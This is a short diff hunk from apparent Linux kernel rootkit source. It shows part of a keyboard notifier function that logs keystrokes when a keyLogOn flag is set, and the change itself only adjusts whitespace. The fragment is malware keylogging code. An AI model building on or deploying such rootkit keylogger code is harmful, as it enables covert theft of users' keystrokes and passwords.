@@ -136,7 +136,7 @@ module_exit(rootkit_exit);
 
 int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
 	struct keyboard_notifier_param *param = p;
-   	if(kcode == KBD_KEYCODE && keyLogOn){
+   	if(kcode == KBD_KEYCODE &&  keyLogOn){
         if( param->value==42 || param->value==54 ){
             down(&s);
             if(param->down > 0){
